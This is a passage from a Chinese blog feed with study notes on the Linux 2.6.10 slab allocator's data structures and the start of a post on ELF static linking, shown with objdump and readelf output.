<ul>
<li><p><strong>存储的数据类型可能会影响内存区域的分配方式</strong>：例如，当内核为用户模式进程分配一个页面框架（page frame）时，内核会调用 <code>get_free_page()</code> 函数，该函数会将页面填充为全零，以确保新分配的内存没有残留数据。</p>
<p><strong>slab 分配器的概念扩展了这一思想</strong>：它将内存区域视为对象，而这些对象不仅仅是简单的内存块，它们还包含一组数据结构和几个函数或方法，这些函数分别称为**构造函数（constructor）**和**析构函数（destructor）**。构造函数负责在内存分配时初始化该内存区域，而析构函数则负责在内存释放时对该内存区域进行清理。</p>
<p>slab 分配器确实在分配之后不会自动清除数据，而是将已经分配但释放的对象缓存起来，以便在下次需要同类对象时可以快速重复使用，避免频繁的内存分配和释放操作。这确实意味着，当某个对象从 slab 缓存中被重新分配时，它仍然可能包含上次使用时的旧数据。这种行为是有意为之的，以提高系统性能，减少不必要的初始化开销。</p>
<p>实际上，Linux 处理的内存区域不需要初始化或取消初始化。出于效率原因，Linux 并不依赖需要构造函数或析构函数的方法；引入 slab 分配器的主要动机是为了减少对伙伴系统分配器的调用。因此，尽管内核完全支持构造函数和析构函数的方法，但这些方法的指针通常都是 <code>NULL</code>。</p>
</li>
<li><p><strong>内核倾向于请求相同类型的区域</strong></p>
</li>
<li><p><strong>内存区域的请求可以根据其频率进行分类</strong>。对于某些特定大小且预期会频繁出现的请求，最有效的处理方式是创建一组具有合适大小的特殊用途对象，从而避免内部碎片化。与此同时，那些不常遇到的大小可以通过基于一系列几何分布大小的分配方案来处理（例如 Linux 2.0 中使用的 2 的幂次方大小），即使这种方法可能会导致内部碎片化。</p>
</li>
<li><p>数据结构的初始地址不容易集中在2的幂的分布上。</p>
</li>
<li><p>硬件缓存性能为尽可能减少对伙伴系统分配器调用提供了额外的理由：每次调用伙伴系统函数都会“弄脏”硬件缓存，从而增加平均内存访问时间。</p>
</li>
</ul>
<blockquote>
<p>组件图解：</p>
<p><strong>Cache</strong>：表示对象缓存（object cache），它存储了用于特定类型对象的 slab。Cache 负责管理 slab 并根据需要分配和回收对象。</p>
<p><strong>Slab</strong>：Slab 是分配的基本单位，它由若干个已经初始化的对象组成。每个 slab 都包含多个对象的内存块，这些对象可以被分配给程序使用。</p>
<p><strong>Object</strong>：具体的对象实例存储在 slab 中，当系统请求分配对象时，分配器从 slab 中取出空闲的对象返回给程序。当对象被释放时，它会返回到 slab 中，以供以后再次使用。</p>
<p>注：slab不会主动释放对象。</p>
</blockquote>
<p><img src="/img/mypic/linux/slab.png" alt="image-20240911211150355"></p>
<h3 id="2-2数据结构"><a href="#2-2数据结构" class="headerlink" title="2.2数据结构"></a>2.2数据结构</h3><h4 id="2-2-1-OVERLOOK"><a href="#2-2-1-OVERLOOK" class="headerlink" title="2.2.1 OVERLOOK"></a>2.2.1 OVERLOOK</h4><blockquote>
<p>linux2.6.10为例</p>
</blockquote>
<p>先理清不同数据结构之间的关系，slab.c中，一段注释描述的非常好。</p>
<blockquote>
<p>内存被组织成缓存区，每种对象类型都有一个缓存区。</p>
<ul>
<li>例如：<code>inode_cache</code>、<code>dentry_cache</code>、<code>buffer_head</code>、<code>vm_area_struct</code>。</li>
<li>每个缓存区由多个 slab 组成（它们很小，通常只占用一页内存，并且始终是连续的），每个 slab 包含多个已初始化的对象。</li>
</ul>
<p>这意味着，构造函数只会在新分配的 slab 上使用，并且你必须将具有相同初始化的对象传递给 <code>kmem_cache_free</code> 函数。</p>
<p>每个缓存区只能支持一种内存类型（如 <code>GFP_DMA</code>、<code>GFP_HIGHMEM</code>、普通内存）。如果需要特殊的内存类型，则必须为该内存类型创建一个新的缓存区。</p>
<p>为了减少内存碎片，slab 被分成三类：</p>
<ul>
<li>已满的 slab（没有空闲对象）</li>
<li>部分使用的 slab</li>
<li>空的 slab（没有分配的对象）</li>
</ul>
<p>如果存在部分使用的 slab，则新的分配会从这些 slab 中获取，否则从空的 slab 中分配，或是分配新的 slab。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">* The memory is organized in caches, one cache <span class="keyword">for</span> each object type.</span><br><span class="line">* (e.g. inode_cache, dentry_cache, buffer_head, vm_area_struct)</span><br><span class="line">* Each cache consists out of many <span class="title function_">slabs</span> <span class="params">(they are small (usually one</span></span><br><span class="line"><span class="params">* page <span class="type">long</span>) and always contiguous)</span>, and each slab contains multiple</span><br><span class="line">* initialized objects.</span><br><span class="line">*</span><br><span class="line">* This means, that your constructor is used only <span class="keyword">for</span> newly allocated</span><br><span class="line">* slabs and you must pass objects with the same intializations to</span><br><span class="line">* kmem_cache_free.</span><br><span class="line">*</span><br><span class="line">* Each cache can only support one memory <span class="title function_">type</span> <span class="params">(GFP_DMA, GFP_HIGHMEM,</span></span><br><span class="line"><span class="params">* normal)</span>. If you need a special memory type, then must create a new</span><br><span class="line">* cache <span class="keyword">for</span> that memory type.</span><br><span class="line">*</span><br><span class="line">* In order to reduce fragmentation, the slabs are sorted in 3 groups:</span><br><span class="line">*   full slabs with 0 <span class="built_in">free</span> objects</span><br><span class="line">*   partial slabs</span><br><span class="line">*   empty slabs with no allocated objects</span><br><span class="line">*</span><br><span class="line">* If partial slabs exist, then new allocations come from these slabs,</span><br><span class="line">* otherwise from empty slabs or new slabs are allocated.</span><br></pre></td></tr></table></figure>

<h4 id="2-2-2-Cache"><a href="#2-2-2-Cache" class="headerlink" title="2.2.2 Cache"></a>2.2.2 Cache</h4><blockquote>
<p>每种Cache类型都有一个此结构体：</p>
<h3 id="1-每个-CPU-的缓存-array-NR-CPUS"><a href="#1-每个-CPU-的缓存-array-NR-CPUS" class="headerlink" title="1. 每个 CPU 的缓存 (array[NR_CPUS])"></a>1. <strong>每个 CPU 的缓存 (<code>array[NR_CPUS]</code>)</strong></h3><ul>
<li><code>struct array_cache *array[NR_CPUS]</code>：这是每个 CPU 的私有缓存结构，每个 CPU 都有自己的 <code>array_cache</code> 来缓存从 slab 中分配或释放的对象。这是 per-CPU 数据结构，用于减少全局锁竞争。</li>
<li><code>batchcount</code> 和 <code>limit</code> 定义了每次批量操作的数量，以及每个 CPU 缓存中可以存放的对象的数量上限。</li>
</ul>
<h3 id="2-全局-slab-列表-lists"><a href="#2-全局-slab-列表-lists" class="headerlink" title="2. 全局 slab 列表 (lists)"></a>2. <strong>全局 slab 列表 (<code>lists</code>)</strong></h3><ul>
<li><code>struct kmem_list3 lists</code>：这个结构体用于存放和管理全局的 slab 列表。Slab 分为三类：完全分配的 slab、部分使用的 slab 和空的 slab。</li>
<li>Slab 分配和释放时，首先检查 per-CPU 缓存（<code>array_cache</code>），如果缓存中有空闲对象，可以直接从中分配或将对象释放回缓存。如果 per-CPU 缓存满了或耗尽，则会与 <code>lists</code> 中的全局 slab 进行交互，从全局 slab 列表中分配或释放对象。</li>
</ul>
<h3 id="3-对象和-slab-的尺寸信息"><a href="#3-对象和-slab-的尺寸信息" class="headerlink" title="3. 对象和 slab 的尺寸信息"></a>3. <strong>对象和 slab 的尺寸信息</strong></h3><ul>
<li><code>objsize</code>：表示每个对象的大小，Slab 分配器需要知道每个 slab 能够容纳的对象数量。</li>
<li><code>num</code>：表示每个 slab 可以容纳的对象数量，这个值根据 <code>objsize</code> 和内存页大小计算得出。</li>
<li><code>slab_size</code>：表示每个 slab 的大小，通常是以页为单位（如 4KB）。通过 <code>gfporder</code> 决定每个 slab 的页数，即以 2 的幂次表示。</li>
</ul>
<h3 id="4-Slab-的分配和释放控制"><a href="#4-Slab-的分配和释放控制" class="headerlink" title="4. Slab 的分配和释放控制"></a>4. <strong>Slab 的分配和释放控制</strong></h3><ul>
<li><code>gfporder</code>：定义每个 slab 分配的内存页数，通常是 2 的幂次。<code>gfporder=0</code> 表示每个 slab 占用 1 页（通常是 4KB），<code>gfporder=1</code> 表示占用 2 页。</li>
<li><code>gfpflags</code>：定义 slab 分配时使用的内存分配标志，通常包括 GFP 高优先级（如 <code>GFP_KERNEL</code>、<code>GFP_DMA</code> 等），用于定义内存分配策略。</li>
<li><code>spinlock</code>：用于在多处理器系统中对全局 slab 进行同步，防止并发访问冲突。这个锁主要在 <code>lists</code> 中的 slab 分配和回收时使用。</li>
</ul>
<h3 id="5-颜色优化（cache-colouring）"><a href="#5-颜色优化（cache-colouring）" class="headerlink" title="5. 颜色优化（cache colouring）"></a>5. <strong>颜色优化（cache colouring）</strong></h3><ul>
<li><code>colour</code>、<code>colour_off</code>、<code>colour_next</code>：这些字段用于实现缓存着色（cache colouring）技术，缓存着色的主要目的是为了减少缓存冲突，提高缓存命中率。它通过在每次分配 slab 时在不同的偏移位置开始分配对象，从而避免多个对象在缓存中的地址出现冲突。</li>
</ul>
<h3 id="6-构造和析构函数"><a href="#6-构造和析构函数" class="headerlink" title="6. 构造和析构函数"></a>6. <strong>构造和析构函数</strong></h3><ul>
<li><code>ctor</code> 和 <code>dtor</code>：这些是构造函数和析构函数指针，用于在分配 slab 时对对象进行初始化（构造）和在释放时执行清理（析构）。这有助于在对象分配和回收时保持一致性和清理工作。</li>
</ul>
<h3 id="7-Slab-的分配和增长"><a href="#7-Slab-的分配和增长" class="headerlink" title="7. Slab 的分配和增长"></a>7. <strong>Slab 的分配和增长</strong></h3><ul>
<li>Slab 的增长机制（<code>cache_grow</code>）是在当前缓存不够时，分配新的 slab 并将其添加到全局或 per-CPU 的 slab 列表中。<code>kmem_cache_s</code> 中的 <code>gfporder</code> 和 <code>gfpflags</code> 控制 slab 的增长过程。</li>
<li>当内存紧张时，Slab 分配器也会通过 <code>cache_shrink</code> 机制来释放多余的 slab，这些 slab 的状态是空闲的，意味着没有分配的对象。</li>
</ul>
<h3 id="8-统计信息（可选）"><a href="#8-统计信息（可选）" class="headerlink" title="8. 统计信息（可选）"></a>8. <strong>统计信息（可选）</strong></h3><ul>
<li>如果开启了 <code>STATS</code> 宏，<code>kmem_cache_s</code> 还可以跟踪相关的统计信息，如活跃对象数量、分配次数、释放次数、缓存命中率等。</li>
<li>这些统计信息有助于分析和优化内存分配的性能。</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_s</span> &#123;</span></span><br><span class="line"><span class="comment">/* 1) per-cpu data, touched during every alloc/free */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span>	*<span class="title">array</span>[<span class="title">NR_CPUS</span>];</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		batchcount;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		limit;</span><br><span class="line"><span class="comment">/* 2) touched by every alloc &amp; free from the backend */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_list3</span>	<span class="title">lists</span>;</span></span><br><span class="line">	<span class="comment">/* NUMA: kmem_3list_t	*nodelists[MAX_NUMNODES] */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		objsize;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>	 	flags;	<span class="comment">/* constant flags */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		num;	<span class="comment">/* # of objs per slab */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		free_limit; <span class="comment">/* upper limit of objects in the lists */</span></span><br><span class="line">	<span class="type">spinlock_t</span>		spinlock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 3) cache_grow/shrink */</span></span><br><span class="line">	<span class="comment">/* order of pgs per slab (2^n) */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		gfporder;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* force GFP flags, e.g. GFP_DMA */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		gfpflags;</span><br><span class="line"></span><br><span class="line">	<span class="type">size_t</span>			colour;		<span class="comment">/* cache colouring range */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		colour_off;	<span class="comment">/* colour offset */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		colour_next;	<span class="comment">/* cache colouring */</span></span><br><span class="line">	<span class="type">kmem_cache_t</span>		*slabp_cache;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		slab_size;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		dflags;		<span class="comment">/* dynamic flags */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* constructor func */</span></span><br><span class="line">	<span class="type">void</span> (*ctor)(<span class="type">void</span> *, <span class="type">kmem_cache_t</span> *, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* de-constructor func */</span></span><br><span class="line">	<span class="type">void</span> (*dtor)(<span class="type">void</span> *, <span class="type">kmem_cache_t</span> *, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 4) cache creation/removal */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*name;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> STATS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		num_active;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		num_allocations;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		high_mark;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		grown;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		reaped;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> 		errors;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		max_freeable;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		node_allocs;</span><br><span class="line">	<span class="type">atomic_t</span>		allochit;</span><br><span class="line">	<span class="type">atomic_t</span>		allocmiss;</span><br><span class="line">	<span class="type">atomic_t</span>		freehit;</span><br><span class="line">	<span class="type">atomic_t</span>		freemiss;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> DEBUG</span></span><br><span class="line">	<span class="type">int</span>			dbghead;</span><br><span class="line">	<span class="type">int</span>			reallen;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>关于<code>struct array_cache	*array[NR_CPUS];</code>,其中存放了每个cpu的缓存对象，可以不访问全局slab而直接访问缓存对象,可有效防止同步竞争。具体结构体为：</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> avail;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> limit;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> batchcount;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> touched;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bootstrap: The caches do not work without cpuarrays anymore,</span></span><br><span class="line"><span class="comment"> * but the cpuarrays are allocated from the generic caches...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOOT_CPUCACHE_ENTRIES	1</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">arraycache_init</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> <span class="title">cache</span>;</span></span><br><span class="line">	<span class="type">void</span> * entries[BOOT_CPUCACHE_ENTRIES];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-3-slab"><a href="#2-2-3-slab" class="headerlink" title="2.2.3 slab"></a>2.2.3 slab</h4><blockquote>
<p>利用s_mem来存储obj</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The slab lists of all objects.</span></span><br><span class="line"><span class="comment"> * Hopefully reduce the internal fragmentation</span></span><br><span class="line"><span class="comment"> * NUMA: The spinlock could be moved from the kmem_cache_t</span></span><br><span class="line"><span class="comment"> * into this structure, too. Figure out what causes</span></span><br><span class="line"><span class="comment"> * fewer cross-node spinlock operations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_list3</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">slabs_partial</span>;</span>	<span class="comment">/* partial list first, better asm code */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">slabs_full</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">slabs_free</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	free_objects;</span><br><span class="line">	<span class="type">int</span>		free_touched;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>	next_reap;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span>	*<span class="title">shared</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>	<span class="title">list</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span>		colouroff;</span><br><span class="line">	<span class="type">void</span>			*s_mem;		<span class="comment">/* including colour offset */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		inuse;		<span class="comment">/* num of objs active in slab */</span></span><br><span class="line">	<span class="type">kmem_bufctl_t</span>		<span class="built_in">free</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>linux内核</category>
        <category>初探</category>
      </categories>
      <tags>
        <tag>linux内核</tag>
      </tags>
  </entry>
  <entry>
    <title>ELF之链接初探</title>
    <url>/2024/08/15/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/%E9%93%BE%E6%8E%A5%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/ELF%E4%B9%8B%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5/</url>
    <content><![CDATA[<h1 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* a.c */</span></span><br><span class="line"><span class="type">int</span> shared = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*b.c*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b)</span> &#123;</span><br><span class="line">    *b ^= *a ^= *b ^= *a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h1><blockquote>
<p>主要分为两步：</p>
<p>1.空间和地址分配</p>
<p>2.符号解析和重定位</p>
</blockquote>
<h2 id="空间和地址分配"><a href="#空间和地址分配" class="headerlink" title="空间和地址分配"></a>空间和地址分配</h2><blockquote>
<p>主要涉及到相似节合并和虚拟地址空间的分配以及映射关系的建立,可以观察到VMA在链接之后被分配</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># objdump -h ab</span></span><br><span class="line"></span><br><span class="line">ab:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  <span class="number">0</span> .note.gnu.property <span class="number">00000020</span>  <span class="number">00000000004001</span>c8  <span class="number">00000000004001</span>c8  <span class="number">000001</span>c8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">1</span> .text         <span class="number">00000084</span>  <span class="number">0000000000401000</span>  <span class="number">0000000000401000</span>  <span class="number">00001000</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line">  <span class="number">2</span> .eh_frame     <span class="number">00000058</span>  <span class="number">0000000000402000</span>  <span class="number">0000000000402000</span>  <span class="number">00002000</span>  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">3</span> .data         <span class="number">00000004</span>  <span class="number">0000000000404000</span>  <span class="number">0000000000404000</span>  <span class="number">00003000</span>  <span class="number">2</span>**<span class="number">2</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  <span class="number">4</span> .comment      <span class="number">0000002b</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00003004</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">root@L:/home/l/c++<span class="meta"># objdump -h a.o</span></span><br><span class="line"></span><br><span class="line">a.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  <span class="number">0</span> .text         <span class="number">00000035</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00000040</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, CODE</span><br><span class="line">  <span class="number">1</span> .data         <span class="number">00000004</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00000078</span>  <span class="number">2</span>**<span class="number">2</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  <span class="number">2</span> .bss          <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000007</span>c  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  ALLOC</span><br><span class="line">  <span class="number">3</span> .comment      <span class="number">0000002</span>c  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000007</span>c  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">4</span> .note.GNU-<span class="built_in">stack</span> <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>a8  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">5</span> .note.gnu.property <span class="number">00000020</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>a8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">6</span> .eh_frame     <span class="number">00000038</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>c8  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA</span><br><span class="line">root@L:/home/l/c++<span class="meta"># objdump -h b.o</span></span><br><span class="line"></span><br><span class="line">b.o:     file format elf64-x86<span class="number">-64</span></span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA               LMA               File off  Algn</span><br><span class="line">  <span class="number">0</span> .text         <span class="number">0000004f</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">00000040</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br><span class="line">  <span class="number">1</span> .data         <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000008f</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">  <span class="number">2</span> .bss          <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000008f</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  ALLOC</span><br><span class="line">  <span class="number">3</span> .comment      <span class="number">0000002</span>c  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000008f</span>  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">4</span> .note.GNU-<span class="built_in">stack</span> <span class="number">00000000</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000b</span>b  <span class="number">2</span>**<span class="number">0</span></span><br><span class="line">                  CONTENTS, READONLY</span><br><span class="line">  <span class="number">5</span> .note.gnu.property <span class="number">00000020</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000</span>c0  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, DATA</span><br><span class="line">  <span class="number">6</span> .eh_frame     <span class="number">00000038</span>  <span class="number">0000000000000000</span>  <span class="number">0000000000000000</span>  <span class="number">000000e0</span>  <span class="number">2</span>**<span class="number">3</span></span><br><span class="line">                  CONTENTS, ALLOC, LOAD, RELOC, READONLY, DATA</span><br></pre></td></tr></table></figure>

<h2 id="符号解析和重定位"><a href="#符号解析和重定位" class="headerlink" title="符号解析和重定位"></a>符号解析和重定位</h2><h3 id="先来看一下结果"><a href="#先来看一下结果" class="headerlink" title="先来看一下结果"></a>先来看一下结果</h3><blockquote>
<p>可以看到符号的地址已经变成了VMA</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s ab</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">9</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS b.c</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000401035</span>    <span class="number">79</span> FUNC    GLOBAL DEFAULT    <span class="number">2</span> swap</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000404000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">4</span> shared</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000404004</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT    <span class="number">4</span> __bss_start</span><br><span class="line">     <span class="number">6</span>: <span class="number">0000000000401000</span>    <span class="number">53</span> FUNC    GLOBAL DEFAULT    <span class="number">2</span> main</span><br><span class="line">     <span class="number">7</span>: <span class="number">0000000000404004</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT    <span class="number">4</span> _edata</span><br><span class="line">     <span class="number">8</span>: <span class="number">0000000000404008</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT    <span class="number">4</span> _end</span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s a.O</span></span><br><span class="line">readelf: Error: <span class="string">&#x27;a.O&#x27;</span>: No such file</span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s a.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">6</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span class="line">     <span class="number">1</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> FILE    LOCAL  DEFAULT  ABS a.c</span><br><span class="line">     <span class="number">2</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> SECTION LOCAL  DEFAULT    <span class="number">1</span> .text</span><br><span class="line">     <span class="number">3</span>: <span class="number">0000000000000000</span>     <span class="number">4</span> OBJECT  GLOBAL DEFAULT    <span class="number">3</span> shared</span><br><span class="line">     <span class="number">4</span>: <span class="number">0000000000000000</span>    <span class="number">53</span> FUNC    GLOBAL DEFAULT    <span class="number">1</span> main</span><br><span class="line">     <span class="number">5</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  GLOBAL DEFAULT  UND swap</span><br><span class="line">root@L:/home/l/c++<span class="meta"># readelf -s b.o</span></span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">&#x27;.symtab&#x27;</span> contains <span class="number">4</span> entries:</span><br><span class="line">   Num:    Value          Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     <span class="number">0</span>: <span class="number">0000000000000000</span>     <span class="number">0</span> NOTYPE  LOCAL  DEFAULT  UND </span><br><span 